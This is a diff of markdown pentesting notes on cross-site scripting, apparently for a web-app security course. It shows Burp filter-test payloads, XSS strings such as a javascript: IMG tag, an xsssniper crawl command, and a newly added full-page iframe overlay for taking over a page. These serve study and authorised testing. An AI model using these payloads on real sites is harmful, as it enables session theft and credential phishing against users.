@@ -14,7 +14,7 @@ order: 5
 
 **Using Burp - Step 2 Filter Test:**
 1. Repeat above with sniper and the following payloads (simple list):
-* <code> <>[]{}()$--'#"&;/ </code>
+* <code> &lt;&gt;[]{}()$--'#&#34;&amp;;/ </code>
 * <code> '';!--"<XSS>=&{()} </code>
 * <code> <x>'"()= </code>
 * <code> ;[]{}'"() </code>
@@ -46,12 +46,12 @@ order: 5
 <IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
 {% endhighlight %}
 
-Tools:
+**Tools:**
 * XSSer 
 * xssniper
 * XSScrapy (xsssniper -u "http://sec542.com" --crawl --forms -http-proxy 127.0.0.1:8082)
 
-Resources:
+**Resources:**
 * [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
 > **Javascript Events for XSS**
@@ -110,6 +110,13 @@ http://www.sec542.org/PhpMyAdmin/index.php?lang=<script>var lo=document.location
 "
 {% endhighlight %}
 
+**Take Over a Page**
+{% highlight html %}
+<style type="text/css"> <! -- .style11 {position:fixed; top:0px; left:0px; bottom:0px; right:opx; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;} //-->
+</style>
+
+<iframe class="style11" src="http://127.127.127.127/www.sans.org/account/" frameborder="0" scrolling="no" />
+{% endhighlight %}
 
 > **Useful Resources**
 
